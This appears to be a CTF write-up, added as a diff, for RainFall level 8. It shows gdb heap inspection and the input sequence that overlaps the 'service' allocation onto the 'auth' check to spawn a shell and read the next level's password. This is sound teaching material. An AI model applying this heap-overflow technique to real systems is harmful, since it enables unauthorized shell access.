@@ -1,0 +1,91 @@
+# Level 08
+
+## Analysis
+
+## Attack type: Heap Buffer overflow to pass a condition
+
+We decompile code with dogbolt https://dogbolt.org/?id=c81dd233-7ccb-4ab8-8074-27857c96eb14 because ghidra output was not very clean. It seems the program is essentially a loop where you enter some args to execute action. Each loop, printf function show us two addresses. We found that those varaiables are globals pointer and both pointer will be initialyze on heap. The main goal is to execute this call `system("/bin/sh");`, this is conditioned by the existant of char at the address pointed by `auth` global + 32. **But** we can't initialyse the `auth` variable with a string that exceed 30 chars.
+
+We started to open binary with gdb to understand the heap state when you initialyse globals. First command to initialyse `auth` is `auth [login]` and to initialyse `service`, you have to use the command `service`, that perform strdup, with `service[string]`. Let's start to look the heap.
+
+```bash
+level8@RainFall:~$ gdb level8
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level8/level8...(no debugging symbols found)...done.
+(gdb) b printf
+Breakpoint 1 at 0x8048410
+(gdb) r
+Starting program: /home/user/level8/level8
+
+Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) c
+Continuing.
+(nil), (nil)
+auth AAAA
+
+Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) c
+Continuing.
+0x804a008, (nil)
+serviceBBBB
+
+Breakpoint 1, 0xb7e78850 in printf () from /lib/i386-linux-gnu/libc.so.6
+(gdb) info proc mapping
+process 16700
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/user/level8/level8
+         0x8049000  0x804a000     0x1000        0x0 /home/user/level8/level8
+         0x804a000  0x806b000    0x21000        0x0 [heap]
+        0xb7e2b000 0xb7e2c000     0x1000        0x0
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0
+        0xb7fd9000 0xb7fdd000     0x4000        0x0
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb) x/32x 0x804a000
+0x804a000:      0x00000000      0x00000011      0x41414141      0x0000000a
+0x804a010:      0x00000000      0x00000011      0x42424242      0x0000000a
+0x804a020:      0x00000000      0x00020fe1      0x00000000      0x00000000
+0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a040:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a050:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
+```
+
+We understood that both variable are closely in heap, and second one important thing is that the order you use to initialyze them is very important. In our case initialise `auth` then `service` show us there is a padding of 16 bytes between them
+
+```bash
+(gdb) p (0x804a018 - 0x804a008)
+$1 = 16
+```
+
+We initialy looking to set the 32th bytes of auth to access to shell. So we simply have to keep the order of initialisation and be sure that service is initialised with 16 (padding + length of `service` >= 32) bytes lentgh.
+
+
+```bash
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth AAAA
+0x804a008, (nil)
+serviceBBBBBBBBBBBBBBBB
+0x804a008, 0x804a018
+login
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
